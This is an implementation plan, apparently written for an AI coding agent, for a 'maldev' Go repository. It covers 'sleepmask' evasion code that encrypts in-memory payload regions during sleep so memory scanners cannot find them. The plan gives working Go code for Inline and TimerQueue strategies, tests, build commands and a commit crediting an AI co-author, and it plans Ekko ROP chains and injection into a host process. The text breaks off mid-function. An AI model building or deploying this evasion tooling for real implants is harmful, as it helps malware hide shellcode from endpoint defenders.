# Sleepmask Variants Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the 3-strategy sleep-mask architecture (Inline / TimerQueue / Ekko) + cross-process RemoteMask + `cmd/sleepmask-demo`, replacing the current single-XOR-inline-strategy Mask, and tag v0.12.0.

**Architecture:** `Mask` composes a `Cipher` (XOR/RC4/AES-CTR, already shipped) and a `Strategy` that encapsulates the encrypt→wait→decrypt cycle. Three strategies: `InlineStrategy` (L1), `TimerQueueStrategy` (L2 light — pool thread does the wait), `EkkoStrategy` (L2 full — real NtContinue ROP chain with a plan9 asm resume stub). `RemoteMask` + `RemoteInlineStrategy` cover cross-process masking. `cmd/sleepmask-demo` demonstrates both self-process and host-injection scenarios with a concurrent scanner.

**Tech Stack:** Go 1.21, golang.org/x/sys/windows, plan9 asm (`.s` files), existing `evasion/timing` + `cleanup/memory` + `win/api` packages, `testutil.ScanProcessMemory` + `testutil.WindowsSearchableCanary` for e2e.

**Working directory:** `/home/mathieu/GolandProjects/maldev` (master branch, tree clean after 0a5ada3).

**Reference spec:** `docs/superpowers/specs/2026-04-23-sleepmask-variants-design.md`

---

## File Structure

| Path | Action | Purpose |
|---|---|---|
| `evasion/sleepmask/cipher*.go` | keep | Cipher interface + XOR/RC4/AES (shipped this session, tests green) |
| `evasion/sleepmask/mask.go` | create | Cross-platform `Mask` struct + `New`/`WithCipher`/`WithStrategy`/`Sleep(ctx, d) error` |
| `evasion/sleepmask/mask_windows.go` | rename from `sleepmask_windows.go` | Keep only `Region` + small Windows helpers |
| `evasion/sleepmask/strategy.go` | create | `Strategy` interface, package-level doc on 4 levels |
| `evasion/sleepmask/strategy_inline.go` | create | `InlineStrategy` (Windows — VirtualProtect + cipher + wait) |
| `evasion/sleepmask/strategy_inline_stub.go` | create | non-Windows stub |
| `evasion/sleepmask/strategy_timerqueue_windows.go` | create | `TimerQueueStrategy` L2-light |
| `evasion/sleepmask/strategy_timerqueue_stub.go` | create | non-Windows stub |
| `evasion/sleepmask/strategy_ekko_windows.go` | create | `EkkoStrategy` L2-full (windows+amd64) |
| `evasion/sleepmask/strategy_ekko_amd64.s` | create | plan9 asm `resumeStub` |
| `evasion/sleepmask/strategy_ekko_stub.go` | create | stub for non-(windows+amd64) |
| `evasion/sleepmask/remote_mask.go` | create | `RemoteRegion`, `RemoteStrategy`, `RemoteMask` + builders (cross-platform types, Windows-only method bodies) |
| `evasion/sleepmask/remote_strategy_windows.go` | create | `RemoteInlineStrategy` |
| `evasion/sleepmask/remote_strategy_stub.go` | create | non-Windows stub |
| `evasion/sleepmask/sleepmask_windows.go` | delete | folded into `mask_windows.go` + `strategy_inline.go` |
| `evasion/sleepmask/sleepmask_test.go` | modify | update for new API |
| `evasion/sleepmask/sleepmask_e2e_windows_test.go` | modify | loop over the 3 strategies |
| `evasion/sleepmask/mask_test.go` | create | cross-platform Mask builder tests |
| `evasion/sleepmask/strategy_inline_test.go` | create | cross-platform with FakeCipher |
| `evasion/sleepmask/strategy_inline_windows_test.go` | create | VM test |
| `evasion/sleepmask/strategy_timerqueue_windows_test.go` | create | VM test |
| `evasion/sleepmask/strategy_ekko_windows_test.go` | create | VM test (amd64 only) |
| `evasion/sleepmask/remote_mask_test.go` | create | cross-platform |
| `evasion/sleepmask/remote_mask_windows_test.go` | create | VM test with notepad |
| `win/api/dll_windows.go` | modify | add 5 procs |
| `cmd/sleepmask-demo/main.go` | create | flag parsing + dispatcher |
| `cmd/sleepmask-demo/canary_windows.go` | create | scenario A |
| `cmd/sleepmask-demo/canary_stub.go` | create | non-Windows stub |
| `cmd/sleepmask-demo/host_windows.go` | create | scenario B |
| `cmd/sleepmask-demo/host_stub.go` | create | non-Windows stub |
| `docs/techniques/evasion/sleep-mask.md` | rewrite | per spec outline |
| `CHANGELOG.md` | modify | `[Unreleased]` → `[v0.12.0]` entry |

---

## COMMIT 1 — Cipher + Mask refactor (breaking)

Scope: integrate the already-written Cipher files with Mask, extract the current Sleep body into `InlineStrategy`, switch Sleep to `(ctx, d) error`, remove `SleepMethod`/`WithMethod`.

### Task 1.1 — Stage the cipher files already written

The files `cipher.go`, `cipher_xor.go`, `cipher_rc4.go`, `cipher_aes.go`, `cipher_test.go` were written earlier this session but are untracked. They must be included in Commit 1.

**Files:** (pre-existing, untracked)
- `evasion/sleepmask/cipher.go`
- `evasion/sleepmask/cipher_xor.go`
- `evasion/sleepmask/cipher_rc4.go`
- `evasion/sleepmask/cipher_aes.go`
- `evasion/sleepmask/cipher_test.go`

- [ ] **Step 1: Verify files are present and build green**

```bash
ls -1 evasion/sleepmask/cipher*.go
go build ./evasion/sleepmask/
go test ./evasion/sleepmask/ -run Ciphers -v
```

Expected: 5 files, build green, cipher tests all pass.

### Task 1.2 — Create `strategy.go` with the Strategy interface

**Files:**
- Create: `evasion/sleepmask/strategy.go`

- [ ] **Step 1: Write the file**

```go
package sleepmask

import (
	"context"
	"time"
)

// Strategy encapsulates the encrypt → wait → decrypt cycle. Different
// strategies differ in WHICH thread does the work and HOW the wait is
// performed. The mask holds a Strategy and dispatches to Cycle each
// time Sleep is called.
//
// Strategies must:
//   - Always run the decrypt phase, even if ctx is cancelled during
//     the wait — otherwise the region stays masked and the caller's
//     next access faults.
//   - Preserve the original page protection of every region (capture
//     on encrypt, restore on decrypt).
//   - Maintain the v0.11.0 invariant that VirtualProtect(RW) runs
//     BEFORE the cipher writes to the page.
//
// See docs/techniques/evasion/sleep-mask.md for the level taxonomy
// (L1 inline, L2 light/full, L3 Foliage, L4 BOF) and which strategies
// this package ships.
type Strategy interface {
	// Cycle runs one encrypt → wait(d) → decrypt cycle on the given
	// regions using cipher and key. Returns ctx.Err() if the wait was
	// cancelled, the underlying syscall error otherwise, or nil on
	// clean completion.
	Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error
}
```

- [ ] **Step 2: Verify build**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: both build clean.

### Task 1.3 — Rename `sleepmask_windows.go` → `mask_windows.go`, trim to Region only

**Files:**
- Read current: `evasion/sleepmask/sleepmask_windows.go`
- Create: `evasion/sleepmask/mask_windows.go`
- Delete: `evasion/sleepmask/sleepmask_windows.go`

Current file has `Region`, `SleepMethod`, `MethodNtDelay`, `MethodBusyTrig`, `Mask`, `New`, `WithMethod`, `Sleep`, `xorRegion`. We keep `Region` + Windows-specific helpers (`xorRegion` becomes dead code — delete), move the rest.

- [ ] **Step 1: Write the new `mask_windows.go`**

```go
//go:build windows

package sleepmask

// Region describes a memory region to encrypt during sleep, within the
// current process. For cross-process masking see RemoteRegion.
type Region struct {
	Addr uintptr
	Size uintptr
}
```

- [ ] **Step 2: Delete the old file**

```bash
rm evasion/sleepmask/sleepmask_windows.go
```

- [ ] **Step 3: Confirm tests won't compile yet (expected — the old API is gone)**

```bash
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/ 2>&1 | head -5
```

Expected: errors like "undefined: SleepMethod", "undefined: New", etc. — those will be fixed by the next tasks.

### Task 1.4 — Create `mask.go` with the new cross-platform Mask

**Files:**
- Create: `evasion/sleepmask/mask.go`

- [ ] **Step 1: Write the file**

```go
// Package sleepmask provides encrypted sleep to defeat memory scanning.
// See docs/techniques/evasion/sleep-mask.md for the full treatment.
package sleepmask

import (
	"context"
	"crypto/rand"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/cleanup/memory"
)

// Mask coordinates encrypted sleep over a set of memory regions. The
// cipher (default: XORCipher/32 bytes) transforms the region bytes; the
// strategy (default: &InlineStrategy{}) controls the threading model
// of the encrypt/wait/decrypt cycle.
type Mask struct {
	regions  []Region
	cipher   Cipher
	strategy Strategy
}

// New builds a Mask over the given regions with default cipher + strategy.
func New(regions ...Region) *Mask {
	return &Mask{
		regions:  regions,
		cipher:   NewXORCipher(),
		strategy: &InlineStrategy{},
	}
}

// WithCipher overrides the cipher. nil reverts to the default XOR cipher.
func (m *Mask) WithCipher(c Cipher) *Mask {
	if c == nil {
		c = NewXORCipher()
	}
	m.cipher = c
	return m
}

// WithStrategy overrides the strategy. nil reverts to InlineStrategy.
func (m *Mask) WithStrategy(s Strategy) *Mask {
	if s == nil {
		s = &InlineStrategy{}
	}
	m.strategy = s
	return m
}

// Sleep performs one encrypt → wait → decrypt cycle. A fresh random key
// sized to m.cipher.KeySize() is drawn from crypto/rand and scrubbed
// via cleanup/memory.SecureZero after the cycle. Returns ctx.Err() if
// the wait was cancelled, the strategy's error on syscall failure, or
// nil on success. Zero regions or a non-positive d short-circuits.
func (m *Mask) Sleep(ctx context.Context, d time.Duration) error {
	if len(m.regions) == 0 || d <= 0 {
		return nil
	}
	key := make([]byte, m.cipher.KeySize())
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("sleepmask: key generation: %w", err)
	}
	defer memory.SecureZero(key)

	return m.strategy.Cycle(ctx, m.regions, m.cipher, key, d)
}
```

- [ ] **Step 2: Cross-platform + Windows build check**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/ 2>&1 | head -5
```

Expected: host build should fail on `Region` reference (Windows-only). Windows build fails on missing `InlineStrategy`. Both errors resolved by next tasks.

### Task 1.5 — Create `strategy_inline.go` (Windows) and its stub

**Files:**
- Create: `evasion/sleepmask/strategy_inline.go`
- Create: `evasion/sleepmask/strategy_inline_stub.go`

- [ ] **Step 1: Write the Windows impl**

```go
//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/timing"
)

// InlineStrategy is the L1 strategy: the caller goroutine runs the
// full encrypt → wait → decrypt cycle itself. Simple, dependency-free,
// and the historical default.
//
// Thread model: single goroutine. The return address of the call to
// Sleep is visible on the goroutine's stack during the wait. This is
// fine when the region being masked is separate from the caller's
// code (e.g. Go loader process masking an injected PIC shellcode
// region). For scenarios where the caller's own stack must not
// identify a sleeping beacon, use TimerQueueStrategy or EkkoStrategy.
type InlineStrategy struct {
	// UseBusyTrig switches the wait from time.Sleep (kernel timer) to
	// evasion/timing.BusyWaitTrig (CPU-bound trig loop). Defeats
	// sandbox time-acceleration and hooks on scheduler waits at the
	// cost of one CPU core pegged for the duration of the sleep.
	UseBusyTrig bool
}

// Cycle implements Strategy.
func (s *InlineStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	origProtect := make([]uint32, len(regions))

	// Encrypt phase — VirtualProtect(RW) BEFORE cipher.Apply; RX pages
	// are not writable and Apply would fault otherwise (v0.11.0 bugfix).
	for i, r := range regions {
		if err := windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			return fmt.Errorf("sleepmask/inline: encrypt VirtualProtect: %w", err)
		}
		cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), key)
	}

	// Wait phase — select between timer/BusyTrig and ctx cancellation.
	waitErr := s.wait(ctx, d)

	// Decrypt phase — always runs, even on ctx cancellation.
	for i, r := range regions {
		var tmp uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), key)
		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
	}

	return waitErr
}

// wait blocks for d, honoring ctx. Returns ctx.Err() if cancelled, nil if
// the duration elapsed naturally.
func (s *InlineStrategy) wait(ctx context.Context, d time.Duration) error {
	if s.UseBusyTrig {
		done := make(chan struct{})
		go func() {
			timing.BusyWaitTrig(d)
			close(done)
		}()
		select {
		case <-done:
			return nil
		case <-ctx.Done():
			return ctx.Err()
		}
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
```

- [ ] **Step 2: Write the non-Windows stub**

```go
//go:build !windows

package sleepmask

import (
	"context"
	"errors"
	"time"
)

// InlineStrategy stub on non-Windows. Cycle always returns an error;
// the struct exists so cross-platform Mask code compiles.
type InlineStrategy struct {
	UseBusyTrig bool
}

func (s *InlineStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	return errors.New("sleepmask: InlineStrategy requires Windows")
}

// Region stub for non-Windows (parallel to the Windows Region in mask_windows.go).
type Region struct {
	Addr uintptr
	Size uintptr
}

// Suppress unused-import warning in case the package ends up importing time
// via other stubs later.
var _ = time.Duration(0)
```

- [ ] **Step 3: Build check**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: both green.

### Task 1.6 — Update `sleepmask_test.go` for the new API

**Files:**
- Modify: `evasion/sleepmask/sleepmask_test.go`

Current test file has `//go:build windows`. It uses `New`, `WithMethod(MethodBusyTrig)`, `Sleep(d)`. Update to new API.

- [ ] **Step 1: Read the current file to list the tests**

```bash
grep -E "^func Test" evasion/sleepmask/sleepmask_test.go
```

Expected output (from v0.11.0):
```
TestSleepMask_EncryptDecrypt
TestSleepMask_BusyTrig
TestSleepMask_EncryptedDuringSleep
TestSleepMask_ZeroDuration
TestSleepMask_NoRegions
TestNew
```

- [ ] **Step 2: Rewrite the file to the new API**

```go
//go:build windows

package sleepmask

import (
	"context"
	"testing"
	"time"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestSleepMask_EncryptDecrypt(t *testing.T) {
	data := []byte{0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0x90, 0x90, 0x90}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	mask := New(Region{Addr: addr, Size: uintptr(len(data))})
	require.NoError(t, mask.Sleep(context.Background(), 10*time.Millisecond))

	restored := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
	assert.Equal(t, data, []byte(restored), "bytes must be restored after sleep")
}

func TestSleepMask_BusyTrig(t *testing.T) {
	data := []byte{0x41, 0x42, 0x43, 0x44}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	mask := New(Region{Addr: addr, Size: uintptr(len(data))}).
		WithStrategy(&InlineStrategy{UseBusyTrig: true})
	require.NoError(t, mask.Sleep(context.Background(), 10*time.Millisecond))

	restored := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
	assert.Equal(t, data, []byte(restored))
}

func TestSleepMask_EncryptedDuringSleep(t *testing.T) {
	data := make([]byte, 256)
	for i := range data {
		data[i] = 0xAA
	}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	mask := New(Region{Addr: addr, Size: uintptr(len(data))})

	encrypted := make(chan bool, 1)
	go func() {
		time.Sleep(50 * time.Millisecond)
		region := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
		allAA := true
		for _, b := range region {
			if b != 0xAA {
				allAA = false
				break
			}
		}
		encrypted <- !allAA
	}()

	require.NoError(t, mask.Sleep(context.Background(), 300*time.Millisecond))

	assert.True(t, <-encrypted, "bytes should be scrambled during sleep")
	restored := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
	assert.Equal(t, data, []byte(restored))
}

func TestSleepMask_ZeroDuration(t *testing.T) {
	mask := New(Region{Addr: 0xDEAD, Size: 100})
	require.NoError(t, mask.Sleep(context.Background(), 0))
}

func TestSleepMask_NoRegions(t *testing.T) {
	mask := New()
	require.NoError(t, mask.Sleep(context.Background(), 10*time.Millisecond))
}

func TestSleepMask_CtxCancellation(t *testing.T) {
	data := []byte{0xAA, 0xBB, 0xCC, 0xDD}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()

	mask := New(Region{Addr: addr, Size: uintptr(len(data))})
	err = mask.Sleep(ctx, 5*time.Second) // longer than ctx timeout
	require.Error(t, err, "Sleep must return ctx.Err when cancelled")
	require.ErrorIs(t, err, context.DeadlineExceeded)

	// Decrypt must have still run — bytes restored.
	restored := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
	assert.Equal(t, data, []byte(restored))
}

func TestNew(t *testing.T) {
	t.Run("no_regions", func(t *testing.T) {
		m := New()
		require.NotNil(t, m)
	})
	t.Run("with_region", func(t *testing.T) {
		m := New(Region{Addr: 0x1000, Size: 64})
		require.NotNil(t, m)
	})
}

func TestMask_DefaultCipher(t *testing.T) {
	m := New()
	_, ok := m.cipher.(*XORCipher)
	assert.True(t, ok, "default cipher must be *XORCipher")
}

func TestMask_DefaultStrategy(t *testing.T) {
	m := New()
	_, ok := m.strategy.(*InlineStrategy)
	assert.True(t, ok, "default strategy must be *InlineStrategy")
}

func TestMask_WithCipher_NilFallsBackToDefault(t *testing.T) {
	m := New().WithCipher(nil)
	_, ok := m.cipher.(*XORCipher)
	assert.True(t, ok)
}

func TestMask_WithStrategy_NilFallsBackToDefault(t *testing.T) {
	m := New().WithStrategy(nil)
	_, ok := m.strategy.(*InlineStrategy)
	assert.True(t, ok)
}
```

- [ ] **Step 3: Run the tests on Windows VM**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 60s -run 'TestSleepMask_|TestNew|TestMask_'"
```

Expected: all tests PASS (including new `TestMask_*` and `TestSleepMask_CtxCancellation`).

### Task 1.7 — Update `sleepmask_e2e_windows_test.go` to accept the new API

**Files:**
- Modify: `evasion/sleepmask/sleepmask_e2e_windows_test.go`

The e2e tests currently use `.WithMethod(MethodBusyTrig)`. One test (`TestSleepMaskE2E_BusyTrigAlsoDefeatsScanner`) needs the new strategy API; every other test uses only `New(region)` + `Sleep(d)` — those need `Sleep(ctx, d)` updates.

- [ ] **Step 1: Search for all `mask.Sleep(` and `.WithMethod(` call sites in the file**

```bash
grep -n "mask\.\|Sleep(\|WithMethod" evasion/sleepmask/sleepmask_e2e_windows_test.go
```

Expected: ~10 matches.

- [ ] **Step 2: Apply sed to swap the call sites**

```bash
# Replace mask.Sleep(d) with mask.Sleep(context.Background(), d)
sed -i 's/mask\.Sleep(\([^)]*\))/mask.Sleep(context.Background(), \1)/g' evasion/sleepmask/sleepmask_e2e_windows_test.go
# Replace .WithMethod(MethodBusyTrig) with .WithStrategy(&InlineStrategy{UseBusyTrig: true})
sed -i 's/\.WithMethod(MethodBusyTrig)/.WithStrategy(\&InlineStrategy{UseBusyTrig: true})/g' evasion/sleepmask/sleepmask_e2e_windows_test.go
# Add context import
sed -i '/^import (/,/^)/{s|"sync/atomic"|"context"\n\t"sync/atomic"|}' evasion/sleepmask/sleepmask_e2e_windows_test.go
```

- [ ] **Step 3: Verify no `MethodBusyTrig` or bare `Sleep(` calls remain**

```bash
grep -n "MethodBusyTrig\|MethodNtDelay\|WithMethod" evasion/sleepmask/sleepmask_e2e_windows_test.go
```

Expected: no output.

- [ ] **Step 4: Test compile**

```bash
GOOS=windows GOARCH=amd64 go test -c -o /tmp/sleepmask_e2e.exe ./evasion/sleepmask/
```

Expected: clean compile.

### Task 1.8 — Ensure no external caller references `SleepMethod`/`WithMethod`

**Files:** repo-wide scan

- [ ] **Step 1: Grep for any remaining reference**

```bash
grep -rn "sleepmask\.MethodNtDelay\|sleepmask\.MethodBusyTrig\|sleepmask\.SleepMethod\|\.WithMethod(sleepmask\." /home/mathieu/GolandProjects/maldev --include="*.go" 2>/dev/null
```

Expected: no output (the package is only used by its own tests + the demo we haven't built yet).

### Task 1.9 — Full host + VM test sweep, then commit

- [ ] **Step 1: Host build + test**

```bash
go build ./...
go test ./evasion/sleepmask/... -count=1
```

Expected: all green.

- [ ] **Step 2: Windows VM full package**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 120s"
```

Expected: all existing tests (Cipher round-trip, sleepmask_test, e2e) PASS.

- [ ] **Step 3: Commit**

```bash
git add evasion/sleepmask/cipher*.go \
        evasion/sleepmask/mask.go \
        evasion/sleepmask/mask_windows.go \
        evasion/sleepmask/strategy.go \
        evasion/sleepmask/strategy_inline.go \
        evasion/sleepmask/strategy_inline_stub.go \
        evasion/sleepmask/sleepmask_test.go \
        evasion/sleepmask/sleepmask_e2e_windows_test.go
git rm evasion/sleepmask/sleepmask_windows.go
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" commit -m "$(cat <<'MSG'
feat(sleepmask): Cipher + Strategy composition (v0.12.0 part 1/5)

Introduces the Cipher interface (XOR/RC4/AES-CTR already written this
session) and the Strategy interface (this commit). The Mask is now
composed of a Cipher + Strategy and its Sleep method takes a
context.Context and returns an error.

Breaking changes (pre-1.0 minor):
- Sleep(d time.Duration) -> Sleep(ctx context.Context, d time.Duration) error
- SleepMethod / MethodNtDelay / MethodBusyTrig removed
- (*Mask).WithMethod removed -> use WithStrategy(&InlineStrategy{UseBusyTrig: ...})

L1 behavior preserved: InlineStrategy (default) runs the full cycle on
the caller goroutine and keeps the v0.11.0 VirtualProtect-before-XOR
ordering. All existing e2e tests adapted and still pass.

Co-Authored-By: Claude Sonnet 4.6 (1M context) <noreply@anthropic.com>
MSG
)"
```

---

## COMMIT 2 — TimerQueueStrategy (L2 light)

### Task 2.1 — Add `ProcDeleteTimerQueueTimer` to `win/api/dll_windows.go`

**Files:**
- Modify: `win/api/dll_windows.go`

- [ ] **Step 1: Locate the Kernel32 block**

```bash
grep -n "ProcCreateTimerQueueTimer\|ProcDeleteTimerQueue\b" win/api/dll_windows.go
```

Expected: two lines showing `ProcCreateTimerQueueTimer = Kernel32.NewProc(...)` and `ProcDeleteTimerQueue = Kernel32.NewProc(...)`.

- [ ] **Step 2: Insert `ProcDeleteTimerQueueTimer` alphabetically adjacent**

Edit to add after `ProcDeleteTimerQueue`:

```go
	ProcDeleteTimerQueueTimer      = Kernel32.NewProc("DeleteTimerQueueTimer")
```

- [ ] **Step 3: Verify build**

```bash
GOOS=windows GOARCH=amd64 go build ./...
```

Expected: green.

### Task 2.2 — Write the `TimerQueueStrategy` failing test

**Files:**
- Create: `evasion/sleepmask/strategy_timerqueue_windows_test.go`

- [ ] **Step 1: Write the test (will fail — strategy not yet implemented)**

```go
//go:build windows

package sleepmask

import (
	"context"
	"testing"
	"time"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestTimerQueueStrategy_CycleRoundTrip(t *testing.T) {
	data := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	mask := New(Region{Addr: addr, Size: uintptr(len(data))}).
		WithStrategy(&TimerQueueStrategy{})
	require.NoError(t, mask.Sleep(context.Background(), 50*time.Millisecond))

	assert.Equal(t, data,
		[]byte(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))),
		"bytes must round-trip through TimerQueueStrategy")
}

func TestTimerQueueStrategy_CtxCancellation(t *testing.T) {
	data := []byte{0xAA, 0xBB}
	addr, _ := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Millisecond)
	defer cancel()

	mask := New(Region{Addr: addr, Size: uintptr(len(data))}).
		WithStrategy(&TimerQueueStrategy{})
	err := mask.Sleep(ctx, 5*time.Second)
	require.ErrorIs(t, err, context.DeadlineExceeded)

	// Region must be demasked after cancel (decrypt ran via DeleteTimerQueueTimer's blocking wait).
	assert.Equal(t, data, []byte(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))))
}
```

- [ ] **Step 2: Verify it fails to build (strategy not defined)**

```bash
GOOS=windows GOARCH=amd64 go test -c -o /tmp/tq.exe ./evasion/sleepmask/ 2>&1 | head -3
```

Expected: `undefined: TimerQueueStrategy`.

### Task 2.3 — Implement `TimerQueueStrategy`

**Files:**
- Create: `evasion/sleepmask/strategy_timerqueue_windows.go`
- Create: `evasion/sleepmask/strategy_timerqueue_stub.go`

- [ ] **Step 1: Write the Windows impl**

```go
//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// TimerQueueStrategy is the "L2 light" strategy. The encrypt → wait →
// decrypt cycle runs on a Windows thread-pool worker scheduled via
// CreateTimerQueueTimer; the caller goroutine blocks on an auto-reset
// event until the pool thread signals completion.
//
// Compared to InlineStrategy, the thread doing the actual
// WaitForSingleObject (for the duration d) is a pool worker, not the
// caller. A scanner that flags "thread in Wait whose stack contains
// shellcode return addresses" won't match on the pool thread; the
// caller goroutine is in a different kind of wait (event) whose
// syscall signature differs from Sleep/SleepEx.
//
// This is NOT true Ekko — the caller is still in a kernel wait. For
// the full Ekko experience (beacon thread's RIP inside VirtualProtect
// / SystemFunction032 / WaitForSingleObjectEx via an NtContinue ROP
// chain), use EkkoStrategy.
type TimerQueueStrategy struct{}

// tqState is the struct passed through CreateTimerQueueTimer's context
// parameter to the pool thread callback.
type tqState struct {
	regions   []Region
	cipher    Cipher
	key       []byte
	d         time.Duration
	hDummy    windows.Handle // never-signalled event for the pool thread's WaitForSingleObject
	hDone     windows.Handle // auto-reset event: pool thread signals when decrypt is done
	err       error
}

// tqCallbackAddr is the syscall trampoline for tqCallback. Allocated
// once at first use (package-level sync.Once) so we never leak multiple
// trampolines across Cycle calls.
var (
	tqCallbackOnce sync.Once
	tqCallbackAddr uintptr
)

func timerQueueCallbackAddr() uintptr {
	tqCallbackOnce.Do(func() {
		tqCallbackAddr = syscall.NewCallback(tqCallback)
	})
	return tqCallbackAddr
}

// tqCallback runs on a Windows thread-pool worker. It owns the full
// cycle: VirtualProtect(RW) + encrypt + WaitForSingleObject(hDummy, d)
// + decrypt + VirtualProtect(restore). Always signals state.hDone on exit.
func tqCallback(param uintptr, _ uintptr) uintptr {
	state := (*tqState)(unsafe.Pointer(param))
	defer windows.SetEvent(state.hDone) //nolint:errcheck

	origProtect := make([]uint32, len(state.regions))

	// Encrypt phase.
	for i, r := range state.regions {
		if err := windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			state.err = fmt.Errorf("sleepmask/timerqueue: encrypt protect: %w", err)
			return 0
		}
		state.cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), state.key)
	}

	// Wait phase — on the pool thread.
	d_ms := uint32(state.d / time.Millisecond)
	r1, _, _ := api.ProcWaitForSingleObject.Call(uintptr(state.hDummy), uintptr(d_ms))
	_ = r1 // WAIT_TIMEOUT (expected, event never fires)

	// Decrypt phase — always.
	for i, r := range state.regions {
		var tmp uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		state.cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), state.key)
		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
	}
	return 0
}

// Cycle implements Strategy.
func (s *TimerQueueStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	// Set up events.
	hDummy, err := windows.CreateEvent(nil, 1 /* manual-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/timerqueue: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)
	hDone, err := windows.CreateEvent(nil, 0 /* auto-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/timerqueue: CreateEvent done: %w", err)
	}
	defer windows.CloseHandle(hDone)

	state := &tqState{
		regions: regions, cipher: cipher, key: key, d: d,
		hDummy: hDummy, hDone: hDone,
	}

	// Create one-shot timer firing "now" on the default queue (NULL).
	var hTimer windows.Handle
	const (
		wtExecuteLongFunction = 0x10
		wtExecuteDefault      = 0x0
	)
	r1, _, lastErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		0, // NULL queue = default
